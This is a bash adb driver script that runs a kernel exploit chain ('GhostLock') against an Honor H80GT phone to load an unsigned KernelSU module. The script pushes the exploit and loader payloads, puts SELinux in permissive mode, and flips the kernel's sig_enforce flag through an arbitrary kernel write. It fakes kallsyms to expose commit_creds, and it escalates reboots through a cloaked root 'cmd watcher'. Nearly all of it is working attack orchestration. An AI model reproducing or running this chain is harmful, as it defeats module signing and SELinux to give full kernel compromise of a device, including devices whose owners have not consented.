#!/bin/bash
# ksu/ksu_load_ko.sh — PC-side (adb) KernelSU load driver for the H80GT.
#
# Loads the custom kernelsu.ko via the GhostLock on-device loader flow (the exploit's
# rooted anchor execs an autonomous on-device loader; no interactive round
# trips), defeating BOTH Honor walls that block the standard `ksud late-load`:
#
#   WALL 1 — CONFIG_MODULE_SIG_FORCE=y: the exploit flips the runtime
#     `sig_enforce` bool to 0 (the compile-time flag only sets the DEFAULT;
#     the check is a variable read), so unsigned .ko passes module_sig_check.
#
#   WALL 2 — kallsyms name-stripping: Honor removed commit_creds from
#     /proc/kallsyms, so a naive init_module can't resolve the .ko's
#     SHN_UNDEF symbols. The on-device loader bind-mounts a fake kallsyms =
#     real kallsyms + a PREPENDED line pointing commit_creds at its true
#     runtime address (slide-derived, emitted by the exploit).
#
# Worst case is EKEYREJECTED / ENOEXEC / a panic reboot — never a brick.
#
# Usage:  bash ksu_load_ko.sh
#   MAX_TRIES=3       establish attempts (reboot between)
#   APK=...           KernelSU apk (only if tools/ksud is absent)
#   BIN=...           exploit binary (default: the 'make test' static build)

set -u

ROOT="$(CDPATH= cd -- "$(dirname "$0")/.." && pwd)"
PROJECT="${PROJECT:-annap-AGT-AN00_8.0.0.128}"
BIN_LOCAL="${BIN:-$ROOT/exploit/build/$PROJECT/bin/exploit_static}"
APK="${APK:-}"
KSUD_LOCAL="$ROOT/ksu/tools/ksud"
if [ ! -f "$KSUD_LOCAL" ] && { [ -z "$APK" ] || [ ! -f "$APK" ]; }; then
  echo "ERROR: no $KSUD_LOCAL — set APK=/path/to/KernelSU apk (ksud is extracted from it)" >&2
  exit 1
fi
STAMP=$(date +%Y%m%d_%H%M%S)
WORK=/tmp/ksu_load_$STAMP
SUMMARY="$WORK/SUMMARY.txt"
MAX_TRIES="${MAX_TRIES:-3}"

# RUNDIR: per-run FRESH directory for ALL device payloads. Exploit stray
# writes can corrupt ON-DISK inode metadata (flushed by an abnormal reboot),
# and adb push O_TRUNC KEEPS the poisoned inode — with the sticky 1777 dir,
# shell can never rm/chmod it, so every later run silently execs a dead
# binary. Fresh paths = guaranteed-clean inodes; stale ones are GC'd by the
# root loader while permissive.
RUNDIR=/data/local/tmp/ksu_run_$STAMP
BIN_DEV=$RUNDIR/gl_exploit
KSUD_DEV=$RUNDIR/ksud
KO_LOCAL="$ROOT/ksu/tools/kernelsu.ko"   # custom build: KSU v3.2.5 against MagicOS 5.10.168 + device config — struct offsets match Honor's kernel; see ksu/README.md
KO_DEV=$RUNDIR/kernelsu.ko
LOADKO_LOCAL="$ROOT/ksu/tools/load_ko"   # custom loader: SHN_ABS resolution via (fake) kallsyms + plain init_module(flags=0)
LOADKO_DEV=$RUNDIR/load_ko
EXPLOG=$RUNDIR/gl_sysctl.log

# ---- flow toggles (bisect/debug; default flow = STAGES=1 ENFORCE=1 ALLOW_SHELL=0) ----
KSU_STAGES="${KSU_STAGES:-1}"        # ksud post-fs-data/services/boot-completed/install after load
KSU_ENFORCE="${KSU_ENFORCE:-1}"      # echo 1 > /sys/fs/selinux/enforce as the last step
KSU_ALLOW_SHELL="${KSU_ALLOW_SHELL:-0}"   # 1 = load with allow_shell=1 (DEV ONLY, non-default)

# FLIP_SIG=1 arms the sig_enforce arb-write walk. With KSU_LOADER set, the exploit emits
# slide-derived runtime addrs to $RUNDIR/ksu_runtime.env at slide-land and
# its anchor execs the loader script.
build_exploit_env(){
  EXPLOIT_ENV="KS_MAX_TRIES=8 SYSCTL_WALK_ATTEMPTS=4 WALK_TRACE=1 SUSPECT_CPU=99999 DM_SETTLE_MS=3000 SE_LINUX=1 FLIP_SIG=1"
  EXPLOIT_ENV="$EXPLOIT_ENV KSU_LOADER=1 KSU_RUNDIR=$RUNDIR LINK_COMMIT_CRED=$LINK_COMMIT_CRED LINK_BOOTID_CTL=$LINK_BOOTID_CTL LINK_BOOTID_BUF=$LINK_BOOTID_BUF"
}

# ---- symbol link addresses (vmlinux-verified); runtime = link + slide ----
# The custom .ko has exactly ONE undefined symbol stripped from device
# kallsyms: commit_creds (T, exported). boot_id ctl/buf (statics, stripped)
# are restored by the module (init.c restore_bootid).
# Defaults come from the selected PROJECT's target.h; env overrides win.
_target_h="$ROOT/exploit/src/targets/$PROJECT/target.h"
_th() { sed -n "s/^#define $1 \\(0x[0-9a-fA-F]*\\).*/\\1/p" "$_target_h" | head -1; }
LINK_COMMIT_CRED="${LINK_COMMIT_CRED:-$(_th LINK_COMMIT_CRED_ADDR)}"
LINK_BOOTID_CTL="${LINK_BOOTID_CTL:-$(_th LINK_BOOTID_CTL_ADDR)}"
LINK_BOOTID_BUF="${LINK_BOOTID_BUF:-$(_th LINK_BOOTID_BUF_ADDR)}"

mkdir -p "$WORK"
log(){ echo "[ksu_load $(date +%H:%M:%S)] $*" | tee -a "$SUMMARY"; }

device_ready(){ adb wait-for-device 2>/dev/null || return 1; for i in $(seq 1 20); do adb shell true 2>/dev/null && return 0; sleep 2; done; return 1; }
wait_boot(){ for i in $(seq 1 40); do [ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" = 1 ] && return 0; sleep 3; done; return 1; }
uptime_s(){ adb shell cat /proc/uptime 2>/dev/null | awk '{print int($1)}' | tr -d '\r'; }
getenforce_dev(){ adb shell getenforce 2>/dev/null | tr -d '\r'; }

# ksud: prefer the repo-shipped binary; fall back to extracting from the APK
extract_ksud(){
  local out="$WORK/ksud"
  if [ -f "$KSUD_LOCAL" ]; then
    cp "$KSUD_LOCAL" "$out" && log "using repo ksud ($(stat -f%z "$out" 2>/dev/null || stat -c%s "$out") bytes)"; return 0
  fi
  if unzip -p "$APK" lib/arm64-v8a/libksud.so > "$out" 2>/dev/null && [ -s "$out" ] && file "$out" | grep -q ELF; then
    log "extracted ksud from APK ($(stat -f%z "$out" 2>/dev/null || stat -c%s "$out") bytes)"; return 0
  fi
  log "WARN: ksud extraction failed (APK=$APK)"; return 1
}

# launch exploit (permissive + sig flip). NEVER infer success/failure from
# `pgrep gl_exploit` — the anchor exec()s `sh` for the loader runner and
# walk children exit between stages, so pgrep goes empty even on a GOOD run.
# Instead, poll the exploit log for the 'anchor rooted' marker (proves the
# cred write landed), then for the sig-flip marker.
establish(){
  log "launching GhostLock (SE_LINUX=1 FLIP_SIG=1 KSU_LOADER=1) detached"
  # logcat live-stream: post-land deaths leave ZERO kernel trace (no oops,
  # empty pstore) — logcat is the only channel that can show a userspace-
  # ordered reset, and streaming lands it on the host before the device dies.
  adb logcat -c 2>/dev/null
  adb logcat -v threadtime > "$WORK/logcat_stream.txt" 2>/dev/null &
  LOGCAT_STREAM_PID=$!
  adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2
  adb shell "mkdir -p $RUNDIR" 2>/dev/null
  push_loader_payloads || return 1
  build_exploit_env
  adb push "$BIN_LOCAL" "$BIN_DEV" >/dev/null 2>&1 && adb shell chmod 755 "$BIN_DEV"
  # sanity: the pushed binary MUST be executable — else the path's inode is
  # poisoned (see RUNDIR comment); bail instead of burning a 300s blind poll.
  if ! adb shell "test -x $BIN_DEV && md5sum $BIN_DEV" 2>/dev/null | grep -q "$(md5 -q "$BIN_LOCAL" | cut -c1-8)"; then
    log "FATAL: pushed binary unreadable/unexecutable at $BIN_DEV (poisoned inode?) — aborting try"
    return 1
  fi
  adb shell "$EXPLOIT_ENV setsid $BIN_DEV >$EXPLOG 2>&1 </dev/null &" 2>/dev/null
  sleep 3
  log "polling EXPLOG for anchor-rooted marker (<=300s) — proves cred write landed"
  local t0; t0=$(date +%s)
  local up=0
  for i in $(seq 1 150); do
    # 'anchor rooted' is printed by the PARENT on the 'R' handshake. Do NOT
    # grep anchor-side prints — the anchor child's stdout does NOT go to EXPLOG.
    if adb shell "grep -qa 'anchor rooted' $EXPLOG 2>/dev/null" 2>/dev/null; then up=1; log "*** anchor ROOTED in $(( $(date +%s)-t0 ))s ***"; break; fi
    # fast-fail on a definitive route-failure marker — don't sit out the 300s.
    if adb shell "grep -qaE 'short route failed|route failed|route-ok' $EXPLOG 2>/dev/null" 2>/dev/null; then
      adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
      if grep -qaE 'short route failed|route failed' "$WORK/exploit.log"; then
        log "route miss (exploit reported route failure) after $(( $(date +%s)-t0 ))s"; return 1
      fi
    fi
    sleep 2
  done
  if [ "$up" = 0 ]; then
    log "route miss: anchor never rooted (exploit didn't reach cred-write); see log"
    adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"; return 1
  fi
  # anchor rooted => permissive is (about to be) on; wait for the sig walk marker.
  log "polling EXPLOG for 'sig_enforce FLIPPED' (<=150s)"
  local s0; s0=$(date +%s)
  for i in $(seq 1 75); do
    if adb shell "grep -qa 'sig_enforce FLIPPED' $EXPLOG 2>/dev/null" 2>/dev/null; then
      log "*** sig_enforce FLIPPED in $(( $(date +%s)-s0 ))s after anchor ***"
      adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
      adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2   # free CPU; cloaked processes (cmd watcher, parked walk waiters) survive — killing a parked waiter panics the kernel
      return 0
    fi
    sleep 2
  done
  log "sig_enforce marker absent after anchor up (walk may have missed); will still attempt load"
  adb shell "cat $EXPLOG 2>/dev/null" > "$WORK/exploit.log"
  adb shell "pkill -9 -f 'gl_ex[p]loit'" 2>/dev/null; sleep 2
  return 0   # permissive+anchor are up; try the load anyway (EKEYREJECTED tells us if sig missed)
}

# confirm sig flip landed in the exploit log
sig_flipped(){ grep -q 'sig_enforce FLIPPED' "$WORK/exploit.log" 2>/dev/null; }

# the on-device ONE-SHOT loader: started BY THE EXPLOIT's anchor (uid 0,
# kernel domain, no seccomp). Self-gates on sig_enforce, staged injection with
# an attr/current health gate, loads, stages, restores knobs, enforces LAST.
write_loader(){
  # Single source of truth: render the canonical template from ksu/tools.
  # Never inline a second copy here — it will silently drift.
  sed -e "s/@ALLOW_SHELL@/$KSU_ALLOW_SHELL/g" -e "s/@STAGES@/$KSU_STAGES/g" \
            -e "s/@ENFORCE@/$KSU_ENFORCE/g" -e "s/@FREEZE_HISECD@/${KSU_FREEZE_HISECD:-0}/g" \
            -e "s|@RUNDIR@|$RUNDIR|g" -e "s/@STAMP@/$STAMP/g" \
      "$ROOT/ksu/tools/ksu_loader.tmpl" > "$WORK/ksu_loader.sh"
}

# push everything the loader needs BEFORE the exploit launches (the anchor
# execs the script mid-chain; there is no post-chain push window)
push_loader_payloads(){
  write_loader
  adb shell "mkdir -p $RUNDIR" 2>/dev/null
  adb push "$KO_LOCAL" "$KO_DEV" >/dev/null 2>&1
  adb push "$LOADKO_LOCAL" "$LOADKO_DEV" >/dev/null 2>&1
  adb push "$ROOT/ksu/tools/kmsg_dumper" "$RUNDIR/kmsg_dumper" >/dev/null 2>&1
  adb push "$ROOT/ksu/tools/magiskpolicy" "$RUNDIR/magiskpolicy" >/dev/null 2>&1
  adb push "$ROOT/ksu/tools/ksu_rules" "$RUNDIR/ksu_rules" >/dev/null 2>&1
  [ -s "$WORK/ksud" ] && adb push "$WORK/ksud" "$KSUD_DEV" >/dev/null 2>&1
  adb push "$WORK/ksu_loader.sh" "$RUNDIR/ksu_loader.sh" >/dev/null 2>&1
  adb shell chmod 755 "$RUNDIR/ksu_loader.sh" "$LOADKO_DEV" "$RUNDIR/magiskpolicy" "$RUNDIR/kmsg_dumper" "$KSUD_DEV" 2>/dev/null
  # sanity: binaries must be statable (poisoned-inode guard — see RUNDIR)
  adb shell "test -x $LOADKO_DEV && test -x $RUNDIR/magiskpolicy && test -x $RUNDIR/ksu_loader.sh" || { log "FATAL: loader payload not executable"; return 1; }
  log "loader payloads staged in $RUNDIR"
}

# the anchor drives the whole load on-device; just wait for the module to
# appear (or the script's DONE/ABORT markers in its log).
await_load(){
  log "awaiting on-device load (<=240s)"
  local t0; t0=$(date +%s)
  for i in $(seq 1 80); do
    if adb shell "grep -qi kernelsu /proc/modules 2>/dev/null"; then
      log "*** kernelsu module LIVE in $(( $(date +%s)-t0 ))s ***"; break
    fi
    if adb shell "grep -qa 'ABORT\|never flipped\|bind-mount FAIL' $RUNDIR/ksu_load.log 2>/dev/null" 2>/dev/null; then
      log "loader script ABORTED — see log"; break
    fi
    sleep 3
  done
  # POST-LAND DEATH WATCH: some successful chains die silently 1-4 min after
  # module load, and the on-device captures become unreadable to shell after
  # the crash-reboot (enforcing + kernel-context-written inode). STREAM-pull
  # them every 5s for 6 min while the device is still up.
  log "post-load watch: streaming kmsg_cap + script log for 360s (death-cause capture)"
  local last_u; last_u=$(uptime_s); last_u=${last_u:-0}
  local alive=1
  # one-time diagnostic: an empty first pull may be EACCES (enforcing already
  # on / poisoned inode view) — capture the cat ERROR.
  local diag; diag=$(adb shell "cat $RUNDIR/ksu_load.log 2>&1 | head -c 200" 2>/dev/null | tr -d '\r')
  [ -z "$diag" ] || log "first-pull diagnostic: ${diag:0:120}"
  for i in $(seq 1 72); do
    # Non-empty-guarded pulls: a post-death adb cat returns EMPTY and a
    # truncating > would clobber the last good capture.
    adb shell "cat $RUNDIR/ksu_load.log 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
    [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/ksu_load.log"
    adb shell "cat $RUNDIR/kmsg_cap.txt 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
    [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/kmsg_cap_stream.txt"
    adb shell "cat $RUNDIR/iomem.txt 2>/dev/null" > "$WORK/.pull_tmp" 2>/dev/null
    [ -s "$WORK/.pull_tmp" ] && cp "$WORK/.pull_tmp" "$WORK/iomem.txt"
    for pf in $(adb shell "ls $RUNDIR/prev_kmsg_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r'); do
      adb shell "cat $pf 2>/dev/null" > "$WORK/$(basename $pf)" 2>/dev/null
    done
    # Death = uptime RESET, NOT a read failure (adbd restarts break adb for
    # seconds). On failure retry up to 90s; only an uptime reading LOWER than
    # the last good one proves a reboot.
    local u; u=$(uptime_s)
    if [ -z "$u" ]; then
      local j
      for j in $(seq 1 18); do sleep 5; u=$(uptime_s); [ -n "$u" ] && break; done
      if [ -z "$u" ]; then
        alive=0
        log "*** adb LOST >90s at +$((i*5))s post-load (device state unknown — likely dead or adbd down) ***"
        break
      fi
    fi
    if [ "$u" -lt $((last_u > 30 ? last_u - 30 : 0)) ] 2>/dev/null; then
      alive=0
      log "*** DEVICE REBOOTED at +$((i*5))s post-load (uptime $last_u -> ${u}s) — pulled traces are in $WORK ***"
      break
    fi
    last_u=$u
    sleep 5
  done
  [ "$alive" = 1 ] && log "device survived the 6-min post-load window"
  kill $LOGCAT_STREAM_PID 2>/dev/null
  adb logcat -d -s KernelSU 2>/dev/null > "$WORK/logcat_kernel_su.txt"
  log "=== ksu_load.log (device) ==="
  cat "$WORK/ksu_load.log" | tee -a "$SUMMARY"
}


# Reboot that WORKS on a userspace-wedged device: adb reboot can silently
# no-op (init/property_service wedged) while printing "reboot: Success" —
# verify via uptime, else escalate to the anchor's cloaked cmd watcher
# ($RUNDIR/cmd_req: "reboot" | "sysrqb"; kernel domain, bypasses init).
reboot_device(){
  log "rebooting (adb)"
  adb reboot 2>/dev/null; sleep 25
  device_ready || return 1
  local u; u=$(uptime_s)
  if [ -n "$u" ] && [ "$u" -lt 120 ] 2>/dev/null; then return 0; fi
  log "adb reboot did NOT take (uptime=${u:-?}s) — device userspace wedged; escalating to anchor cmd-watcher reboot"
  adb shell "printf reboot > $RUNDIR/cmd_req 2>/dev/null" 2>/dev/null
  sleep 25
  device_ready || return 1
  u=$(uptime_s)
  [ -n "$u" ] && [ "$u" -lt 120 ] 2>/dev/null && return 0
  log "cmd-watcher reboot failed too; last resort sysrq b (never s/u!)"
  adb shell "printf sysrqb > $RUNDIR/cmd_req 2>/dev/null" 2>/dev/null
  sleep 25
  device_ready || return 1
  u=$(uptime_s)
  [ -n "$u" ] && [ "$u" -lt 120 ] 2>/dev/null && return 0
  return 1
}

report(){
  echo ""
  echo "============================================================"
  echo " KSU .ko LOAD ATTEMPT  (uptime=$(uptime_s)s, permissive=$(getenforce_dev))"
  echo "------------------------------------------------------------"
  if grep -qiE 'kernelsu' "$WORK/ksu_load.log" 2>/dev/null && grep -qiE 'kernelsu' <(adb shell cat /proc/modules 2>/dev/null); then
    echo " RESULT: *** kernelsu.ko LOADED — check /data/adb/ksu ***"
  elif grep -qiE 'Key was rejected|EKEYREJECTED' "$WORK/ksu_load.log" 2>/dev/null; then
    echo " RESULT: EKEYREJECTED — sig_enforce flip did NOT land (re-check FLIP_SIG walk)"
  elif grep -qiE 'Cannot find symbol' "$WORK/ksu_load.log" 2>/dev/null; then
    echo " RESULT: ksuinit still missing a symbol (addendum incomplete?) — see log"
  elif grep -qiE 'ENOEXEC|exec format|bad version|disagrees about version' "$WORK/ksu_load.log" 2>/dev/null; then
    echo " RESULT: load rejected on ABI/version (MODVERSIONS CRC mismatch) — GKI KMI drift"
  else
    echo " RESULT: INDETERMINATE — inspect $WORK/ksu_load.log + logcat"
  fi
  echo " sig_flipped=$(sig_flipped && echo YES || echo NO)  permissive=$(getenforce_dev)"
  echo " cmd-watcher=$(adb shell "pgrep -f ksucmdwatch 2>/dev/null | head -1" 2>/dev/null | tr -d '\r' | grep -q . && echo UP || echo DOWN) (reaped on success)"
  echo " artifacts: $WORK"
  echo "============================================================"
}

# ---------------- main ----------------
log "KSU .ko load attempt start (tries=$MAX_TRIES)"
device_ready || { log "no device"; exit 1; }
wait_boot || log "boot_completed wait timed out (continuing)"
extract_ksud || true

for t in $(seq 1 "$MAX_TRIES"); do
  log "=== try $t/$MAX_TRIES ==="
  if establish; then
    log "sig_flipped=$(sig_flipped && echo YES || echo NO)"
    # The anchor drives injection+load+enforce on-device; the slide is
    # consumed ON-DEVICE (exploit -> $RUNDIR/ksu_runtime.env).
    await_load
    report
    exit 0
  fi
  log "miss"
  reboot_device || { log "could not reboot device (wedged) — MANUAL REBOOT NEEDED"; exit 1; }
  wait_boot || true
done
log "FAILED after $MAX_TRIES tries"; exit 1
